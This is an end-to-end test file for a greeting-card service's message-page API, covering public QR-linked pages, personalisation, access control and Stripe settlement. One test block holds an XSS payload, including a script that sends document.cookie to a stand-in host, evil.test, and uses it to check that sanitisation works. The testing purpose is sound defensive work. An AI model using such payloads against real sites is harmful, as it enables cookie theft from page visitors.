import { randomUUID } from "node:crypto";
import type { INestApplication } from "@nestjs/common";
import { ConfigService } from "@nestjs/config";
import type { Prisma } from "@prisma/client";
import { accountSchema } from "@kudos/shared-types";
import type { App } from "supertest/types";
import request from "supertest";
import Stripe from "stripe";
import { PrismaService } from "../src/prisma/prisma.service";
import type { EnvConfig } from "../src/config/env.schema";
import { createTestApp } from "./util/create-test-app";
import { mintToken } from "./util/test-jwks";

function buildStripeEventPayload(type: string, dataObject: Record<string, unknown>): string {
  return JSON.stringify({
    id: `evt_${randomUUID()}`,
    object: "event",
    api_version: "2025-01-01",
    created: Math.floor(Date.now() / 1000),
    livemode: false,
    pending_webhooks: 0,
    request: null,
    type,
    // A real checkout.session.completed / async_payment_succeeded always carries
    // a payment_status; default it to "paid" so card-payment fixtures settle,
    // while a test can pass payment_status explicitly to model an async/unpaid one.
    data: {
      object:
        (type === "checkout.session.completed" ||
          type === "checkout.session.async_payment_succeeded") &&
        dataObject.payment_status === undefined
          ? { payment_status: "paid", ...dataObject }
          : dataObject,
    },
  });
}

describe("Messages (e2e)", () => {
  let app: INestApplication<App>;
  let prisma: PrismaService;
  let stripe: Stripe;
  let webhookSecret: string;

  beforeAll(async () => {
    app = await createTestApp();
    prisma = app.get(PrismaService);
    const config = app.get(ConfigService<EnvConfig, true>);
    webhookSecret = config.get("STRIPE_WEBHOOK_SECRET", { infer: true });
    stripe = new Stripe(config.get("STRIPE_SECRET_KEY", { infer: true }));
  });

  afterAll(async () => {
    await app.close();
  });

  function postWebhook(payload: string) {
    const signature = stripe.webhooks.generateTestHeaderString({ payload, secret: webhookSecret });
    return request(app.getHttpServer())
      .post("/webhooks/stripe")
      .set("Content-Type", "application/json")
      .set("stripe-signature", signature)
      .send(payload);
  }

  async function signUp(): Promise<{ token: string; accountId: string }> {
    const token = await mintToken(randomUUID());
    const response = await request(app.getHttpServer())
      .post("/accounts")
      .set("Authorization", `Bearer ${token}`)
      .send({ type: "organisation", name: `Test Centre ${randomUUID()}` })
      .expect(201);
    return { token, accountId: accountSchema.parse(response.body).id };
  }

  /**
   * Drives the full flow up to a paid order so its message pages exist:
   * recipient -> design -> occasion -> approve -> batch order ->
   * pending_payment -> checkout.session.completed webhook.
   */
  async function createPaidOrder(
    token: string,
    recipientFirstName = "Sam",
    designVideoUrl?: string,
    messagePageId?: string,
    designMessagePageId?: string,
  ): Promise<{ batchOrderId: string }> {
    const recipientResponse = await request(app.getHttpServer())
      .post("/recipients")
      .set("Authorization", `Bearer ${token}`)
      .send({
        firstName: recipientFirstName,
        lastName: "Recipient",
        addressLine1: "1 Test Street",
        addressCity: "London",
        addressPostcode: "SW1A 1AA",
      })
      .expect(201);
    const recipientId = (recipientResponse.body as { id: string }).id;

    const templatesResponse = await request(app.getHttpServer())
      .get("/card-designs")
      .set("Authorization", `Bearer ${token}`)
      .expect(200);
    const cardDesignId = (templatesResponse.body as { id: string }[])[0]!.id;
    const designResponse = await request(app.getHttpServer())
      .post("/saved-designs")
      .set("Authorization", `Bearer ${token}`)
      .send({ cardDesignId, name: "Test design" })
      .expect(201);
    const savedDesignId = (designResponse.body as { id: string }).id;

    if (designVideoUrl || designMessagePageId) {
      // Set the design's default video and/or its linked message page (the
      // fields the card designer writes — ADR 0132 / ADR 0137).
      const current = await prisma.savedDesign.findUniqueOrThrow({
        where: { id: savedDesignId },
        select: { document: true },
      });
      await prisma.savedDesign.update({
        where: { id: savedDesignId },
        data: {
          document: {
            ...(current.document as Prisma.JsonObject),
            ...(designVideoUrl ? { videoUrl: designVideoUrl } : {}),
            ...(designMessagePageId ? { messagePageId: designMessagePageId } : {}),
          },
        },
      });
    }

    const occasionResponse = await request(app.getHttpServer())
      .post("/occasions")
      .set("Authorization", `Bearer ${token}`)
      .send({ type: "birthday", occasionDate: "2026-09-01", recipientId })
      .expect(201);
    const occasionId = (occasionResponse.body as { id: string }).id;
    await request(app.getHttpServer())
      .post(`/occasions/${occasionId}/approve`)
      .set("Authorization", `Bearer ${token}`)
      .send({ savedDesignId })
      .expect(201);

    const orderResponse = await request(app.getHttpServer())
      .post("/batch-orders")
      .set("Authorization", `Bearer ${token}`)
      .send({
        lines: [
          {
            occasionId,
            shippingAddressLine1: "1 Test Street",
            shippingAddressCity: "London",
            shippingAddressPostcode: "SW1A 1AA",
            dispatchOption: "asap",
            postageClass: "first_class",
            ...(messagePageId ? { messagePageId } : {}),
          },
        ],
      })
      .expect(201);
    const batchOrderId = (orderResponse.body as { id: string }).id;

    await prisma.batchOrder.update({
      where: { id: batchOrderId },
      data: { status: "pending_payment", paymentMethod: "card" },
    });
    await postWebhook(
      buildStripeEventPayload("checkout.session.completed", {
        id: `cs_test_${randomUUID()}`,
        metadata: { batchOrderId },
      }),
    ).expect(201);

    return { batchOrderId };
  }

  it("lists an account's message pages (video seeded from the design) and personalises one", async () => {
    const { token } = await signUp();
    const seededVideo = "https://youtu.be/dQw4w9WgXcQ";
    await createPaidOrder(token, "Ada", seededVideo);

    const listResponse = await request(app.getHttpServer())
      .get("/messages")
      .set("Authorization", `Bearer ${token}`)
      .expect(200);
    const pages = listResponse.body as {
      id: string;
      slug: string;
      message: string | null;
      videoUrl: string | null;
      viewCount: number;
    }[];
    expect(pages).toHaveLength(1);
    expect(pages[0]!.message).toBeNull();
    // The design's default video is copied onto each recipient's page at order time.
    expect(pages[0]!.videoUrl).toBe(seededVideo);
    const pageId = pages[0]!.id;

    const updateResponse = await request(app.getHttpServer())
      .patch(`/messages/${pageId}`)
      .set("Authorization", `Bearer ${token}`)
      .send({ message: "Happy birthday!", emoji: "🎉" })
      .expect(200);
    expect((updateResponse.body as { message: string }).message).toBe("Happy birthday!");
    expect((updateResponse.body as { emoji: string }).emoji).toBe("🎉");
  });

  it("serves a message page publicly by slug and increments its view count", async () => {
    const { token } = await signUp();
    await createPaidOrder(token, "Grace");
    const link = await prisma.messagePageLink.findFirstOrThrow({
      where: { orderRecipient: { batchOrder: { account: { name: { contains: "Test Centre" } } } } },
      orderBy: { createdAt: "desc" },
    });
    await prisma.messagePage.update({
      where: { id: link.messagePageId },
      data: { message: "You did it!" },
    });

    // No Authorization header — this is the public QR-code target.
    const viewResponse = await request(app.getHttpServer())
      .get(`/messages/${link.slug}`)
      .expect(200);
    expect(viewResponse.body).toEqual({
      available: true,
      title: "Your message",
      message: "You did it!",
      emoji: null,
      videoType: "none",
      embedUrl: null,
      videoUrl: null,
      ctaLabel: null,
      ctaUrl: null,
      allowReplies: false,
      recipientFirstName: "Grace",
      occasionType: "birthday",
    });

    await request(app.getHttpServer()).get(`/messages/${link.slug}`).expect(200);

    const refreshed = await prisma.messagePageLink.findUniqueOrThrow({ where: { id: link.id } });
    expect(refreshed.viewCount).toBe(2);
  });

  /**
   * The message body is written by an account member and rendered as HTML on a
   * public, unauthenticated page with `dangerouslySetInnerHTML`. Two write paths
   * reach the same column: PATCH /message-pages/:id sanitises, PATCH
   * /messages/:id did not. The audience for anything that gets through is not
   * the author — it is every recipient who scans a printed card. See ADR 0181.
   */
  describe("hostile HTML in a message body", () => {
    const HOSTILE =
      `Congratulations!<script>fetch("https://evil.test/"+document.cookie)</script>` +
      `<img src=x onerror="alert(1)"><a href="javascript:alert(2)">click</a>`;

    async function pageIdFor(token: string): Promise<{ pageId: string; slug: string }> {
      await createPaidOrder(token, "Grace");
      const link = await prisma.messagePageLink.findFirstOrThrow({
        where: {
          orderRecipient: { batchOrder: { account: { name: { contains: "Test Centre" } } } },
        },
        orderBy: { createdAt: "desc" },
      });
      return { pageId: link.messagePageId, slug: link.slug };
    }

    it("is stripped by PATCH /messages/:id before it is ever stored", async () => {
      const { token } = await signUp();
      const { pageId } = await pageIdFor(token);

      const response = await request(app.getHttpServer())
        .patch(`/messages/${pageId}`)
        .set("Authorization", `Bearer ${token}`)
        .send({ message: HOSTILE })
        .expect(200);

      // The words survive; the executable parts do not.
      const saved = (response.body as { message: string }).message;
      expect(saved).toContain("Congratulations!");
      expect(saved).not.toContain("<script");
      expect(saved).not.toContain("onerror");
      expect(saved).not.toContain("javascript:");

      // And it is the *stored* value that is clean, not just the response.
      const row = await prisma.messagePage.findUniqueOrThrow({ where: { id: pageId } });
      expect(row.message).toBe(saved);
    });

    it("never reaches the public page, even for a row written before the fix", async () => {
      const { token } = await signUp();
      const { pageId, slug } = await pageIdFor(token);
      // Straight into the column, modelling anything already stored by the
      // unsanitised path — no migration can re-clean those rows, so the read
      // has to.
      await prisma.messagePage.update({ where: { id: pageId }, data: { message: HOSTILE } });

      const view = await request(app.getHttpServer()).get(`/messages/${slug}`).expect(200);

      const served = (view.body as { message: string }).message;
      expect(served).toContain("Congratulations!");
      expect(served).not.toContain("<script");
      expect(served).not.toContain("onerror");
      expect(served).not.toContain("javascript:");
    });

    it("keeps the formatting an author is allowed to use", async () => {
      const { token } = await signUp();
      const { pageId } = await pageIdFor(token);

      const response = await request(app.getHttpServer())
        .patch(`/messages/${pageId}`)
        .set("Authorization", `Bearer ${token}`)
        .send({ message: "<p>Well <strong>done</strong>, Grace</p><ul><li>Nine years</li></ul>" })
        .expect(200);

      expect((response.body as { message: string }).message).toBe(
        "<p>Well <strong>done</strong>, Grace</p><ul><li>Nine years</li></ul>",
      );
    });
  });

  it("classifies an auto-page's seeded provider video as an embed, not a raw upload", async () => {
    // The card designer's "Video link" field collects an embed URL (YouTube et
    // al). An auto-created per-card page must store it as `embed` so the public
    // page renders it in an iframe — storing it as `upload` would play it through
    // a raw <video> tag that can't render a YouTube page (ADR 0132).
    const { token } = await signUp();
    await createPaidOrder(token, "Ivy", "https://youtu.be/dQw4w9WgXcQ");
    const link = await prisma.messagePageLink.findFirstOrThrow({
      where: { orderRecipient: { recipient: { firstName: "Ivy" } } },
      orderBy: { createdAt: "desc" },
    });

    const page = await prisma.messagePage.findUniqueOrThrow({
      where: { id: link.messagePageId },
    });
    expect(page.videoType).toBe("embed");
    expect(page.videoProvider).toBe("youtube");

    const viewResponse = await request(app.getHttpServer())
      .get(`/messages/${link.slug}`)
      .expect(200);
    const body = viewResponse.body as {
      videoType: string;
      embedUrl: string | null;
      videoUrl: string | null;
    };
    expect(body.videoType).toBe("embed");
    // A working iframe src, not the bare watch URL — the public page can play it.
    expect(body.embedUrl).toContain("youtube-nocookie.com/embed/dQw4w9WgXcQ");
    expect(body.videoUrl).toBeNull();
  });

  it("returns 404 for an unknown slug", async () => {
    await request(app.getHttpServer()).get("/messages/doesnotexist").expect(404);
  });

  it("rejects personalising a message page belonging to another account", async () => {
    const owner = await signUp();
    await createPaidOrder(owner.token, "Owner");
    const listResponse = await request(app.getHttpServer())
      .get("/messages")
      .set("Authorization", `Bearer ${owner.token}`)
      .expect(200);
    const pageId = (listResponse.body as { id: string }[])[0]!.id;

    const other = await signUp();
    await request(app.getHttpServer())
      .patch(`/messages/${pageId}`)
      .set("Authorization", `Bearer ${other.token}`)
      .send({ message: "hijacked" })
      .expect(404);

    // Other account sees none of the owner's pages.
    const otherList = await request(app.getHttpServer())
      .get("/messages")
      .set("Authorization", `Bearer ${other.token}`)
      .expect(200);
    expect(otherList.body).toHaveLength(0);
  });

  it("keeps auto-created per-card pages out of the library", async () => {
    const { token } = await signUp();
    await createPaidOrder(token, "Nia");

    // The v1 personalise surface still lists the card's auto-created page…
    const personalise = await request(app.getHttpServer())
      .get("/messages")
      .set("Authorization", `Bearer ${token}`)
      .expect(200);
    expect(personalise.body).toHaveLength(1);

    // …but the v2 library shows only authored pages, so it's empty here.
    const library = await request(app.getHttpServer())
      .get("/message-pages")
      .set("Authorization", `Bearer ${token}`)
      .expect(200);
    expect(library.body).toHaveLength(0);
  });

  it("attaches a chosen library page to a card at settlement", async () => {
    const { token, accountId } = await signUp();
    await prisma.account.update({ where: { id: accountId }, data: { planId: "pro" } });

    const created = await request(app.getHttpServer())
      .post("/message-pages")
      .set("Authorization", `Bearer ${token}`)
      .send({ title: "From the whole team" })
      .expect(201);
    const pageId = (created.body as { id: string }).id;

    await createPaidOrder(token, "Owen", undefined, pageId);

    // The card's QR link points at the chosen page (reuse), not a fresh auto-page.
    const cardLink = await prisma.messagePageLink.findFirstOrThrow({
      where: { messagePageId: pageId, orderRecipientId: { not: null } },
    });
    expect(cardLink.messagePageId).toBe(pageId);

    // The library now shows that page carrying two links: its standalone QR + the card.
    const library = await request(app.getHttpServer())
      .get("/message-pages")
      .set("Authorization", `Bearer ${token}`)
      .expect(200);
    const summary = (library.body as { id: string; linkCount: number }[]).find(
      (page) => page.id === pageId,
    );
    expect(summary?.linkCount).toBe(2);
  });

  it("honours a send that chose no page even when the design links one (ADR 0137)", async () => {
    // The send flow is authoritative: the composer pre-fills the design's linked
    // page, so a send that arrives with no messagePageId is a deliberate "no
    // page" — settlement must NOT silently re-attach the design's page (that
    // would ignore the sender's opt-out). The design-linked page is resolved by
    // the send composer (interactive) or auto-send (automatic), never here.
    const { token, accountId } = await signUp();
    await prisma.account.update({ where: { id: accountId }, data: { planId: "pro" } });

    const created = await request(app.getHttpServer())
      .post("/message-pages")
      .set("Authorization", `Bearer ${token}`)
      .send({ title: "Linked in the designer" })
      .expect(201);
    const pageId = (created.body as { id: string }).id;

    // The design carries the linked page; the send passes no messagePageId.
    await createPaidOrder(token, "Pia", undefined, undefined, pageId);

    // The card gets a fresh auto-page, not the design-linked page.
    const cardLink = await prisma.messagePageLink.findFirstOrThrow({
      where: { orderRecipient: { recipient: { firstName: "Pia" } } },
    });
    expect(cardLink.messagePageId).not.toBe(pageId);
    const autoPage = await prisma.messagePage.findUniqueOrThrow({
      where: { id: cardLink.messagePageId },
    });
    expect(autoPage.title).toBe("Your message");
    // The design's linked page is untouched — it keeps only its standalone link.
    const linkedPageLinks = await prisma.messagePageLink.count({
      where: { messagePageId: pageId },
    });
    expect(linkedPageLinks).toBe(1);
  });

  it("mints a fresh auto-page from the design's video for a send that chose no page (ADR 0137)", async () => {
    // A send with no chosen page always seeds a minimal auto-page from the
    // design's video link — the design's own linked page is never consulted in
    // the settlement path (ownership is enforced upstream, at order creation).
    const { token } = await signUp();
    const seededVideo = "https://youtu.be/dQw4w9WgXcQ";
    await createPaidOrder(token, "Rex", seededVideo);

    const cardLink = await prisma.messagePageLink.findFirstOrThrow({
      where: { orderRecipient: { recipient: { firstName: "Rex" } } },
    });
    // A fresh auto-page seeded from the design's video.
    const autoPage = await prisma.messagePage.findUniqueOrThrow({
      where: { id: cardLink.messagePageId },
    });
    expect(autoPage.videoUrl).toBe(seededVideo);
  });
});
